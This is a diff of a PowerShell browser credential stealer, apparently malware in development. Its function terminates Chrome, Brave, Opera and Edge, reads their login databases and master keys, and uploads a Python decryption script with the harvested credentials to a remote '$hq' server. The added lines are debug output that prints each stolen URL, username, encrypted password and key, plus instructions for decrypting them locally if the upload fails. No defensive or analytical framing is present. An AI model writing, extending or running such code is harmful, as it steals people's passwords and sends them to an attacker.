@@ -4,6 +4,8 @@ function dcinfosnd {
     )
     $ErrorActionPreference = 'SilentlyContinue'
     
+    Write-Host "Starting credential retrieval for Chrome, Brave, Opera and Edge - Python decryptor will be prepared and sent to $hq"
+    Write-Host "======================================================================================"
     
 
     $script:allCredentials = @()
@@ -21,16 +23,16 @@ function dcinfosnd {
             
             Stop-Process -Name $browserName -ErrorAction SilentlyContinue
             
-            
+            Write-Host "Processing $browserName..."
             
             
             if (-not (Test-Path $userDataPath)) {
-                
+                Write-Host "$browserName data not found at $userDataPath"
                 return
             }
             
             if (-not (Test-Path $localStatePath)) {
-                
+                Write-Host "$browserName Local State not found at $localStatePath"
                 return
             }
             
@@ -102,14 +104,14 @@ function dcinfosnd {
                 
                 $dbH = 0
                 if ([WinSQLite3]::Open($dbPath, [ref] $dbH) -ne 0) {
-                   
+                    Write-Host "Failed to open database: $dbPath"
                     [WinSQLite3]::GetErrmsg($dbh)
                     continue
                 }
                 
                 $stmt = 0
                 if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
-                    
+                    Write-Host "Failed to prepare SQL query"
                     [WinSQLite3]::GetErrmsg($dbh)
                     continue
                 }
@@ -134,11 +136,16 @@ function dcinfosnd {
                     $script:credentialsFound = $true
                     
                     
-                    
+                    Write-Host "$browserName ($profileName) - Found credentials:"
+                    Write-Host "URL: $url"
+                    Write-Host "Username: $username"
+                    Write-Host "EncryptedPassword: $encryptedPassword"
+                    Write-Host "Key: $masterKey"
+                    Write-Host "---------------------------"
                 }
             }
             
-            
+            Write-Host "Finished processing $browserName"
         }
         catch [Exception] {
             Write-Host "$browserName error: $($_.Exception.Message)"
@@ -165,7 +172,13 @@ function dcinfosnd {
     $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
     Process-Browser -browserName "edge" -userDataPath $edgePath -localStatePath $edgeLocalState
     
-
+    
+    Write-Host "Debug information:"
+    Write-Host "Credentials found: $script:credentialsFound"
+    Write-Host "Number of credentials: $($script:allCredentials.Count)"
+    Write-Host "Browsers found: $($script:allCredentials | ForEach-Object { $_.browser } | Sort-Object -Unique)"
+    Write-Host "======================================================================================"
+    
     
     if ($script:credentialsFound) {
         
@@ -326,15 +339,19 @@ print(f"Total credentials: {len(credentials)}")
            
             $result = Invoke-RestMethod -Uri $hq -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
             
-            
+            Write-Host "Decryptor script successfully sent to $hq as $outputFilename"
+            Write-Host "Total credentials extracted: $($script:allCredentials.Count)"
         }
         catch {
-           
+            Write-Host "Error sending decryptor: $($_.Exception.Message)"
             
             
             try {
                 $pythonScript | Out-File -FilePath $outputFilename -Encoding utf8
-                
+                Write-Host "Sending failed, Python decryption script saved locally at: $outputFilename"
+                Write-Host "To use it, install required package: pip install pycryptodomex"
+                Write-Host "Then run: python $outputFilename"
+                Write-Host "Total credentials extracted: $($script:allCredentials.Count)"
             }
             catch {
                 Write-Host "Error creating local Python script: $($_.Exception.Message)"
@@ -345,6 +362,5 @@ print(f"Total credentials: {len(credentials)}")
         Write-Host "No credentials found. Cannot create decryption script."
         Write-Host "Check if browsers are installed and contain saved passwords."
     }
-    
 }
 
